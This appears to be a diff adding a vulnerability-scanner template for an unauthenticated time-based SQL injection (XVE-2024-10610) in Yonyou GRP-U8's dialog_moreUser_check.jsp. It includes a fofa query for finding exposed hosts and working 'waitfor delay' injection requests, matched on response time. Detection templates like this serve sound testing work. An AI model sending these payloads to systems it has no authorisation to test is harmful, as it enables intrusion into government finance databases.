@@ -1,0 +1,33 @@
+id: yongyouGRP-U8-dialog_moreUser_check_jsp-sql-XVE-2024-10610
+
+info:
+  tags: yongyouGRP-U8-dialog_moreUser_check_jsp-sql-XVE-2024-10610
+  name: 用友GRP-U8 dialog_moreUser_check.jsp SQL延时注入漏洞 (XVE-2024-10610)
+  author: xc
+  severity: high
+  description: |-
+    fofa: app="用友-GRP-U8"
+    用友GRP-U8R10行政事业内控管理软件 dialog_moreUser_check.jsp 接口处存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。
+
+
+http:
+  - raw:
+      - |
+        GET /u8qx/dialog_moreUser_check.jsp?mlid=';waitfor+delay+'0:0:4'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+      - |
+        GET /u8qx/dialog_moreUser_check.jsp?mlid=';waitfor+delay+'0:0:8'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
+
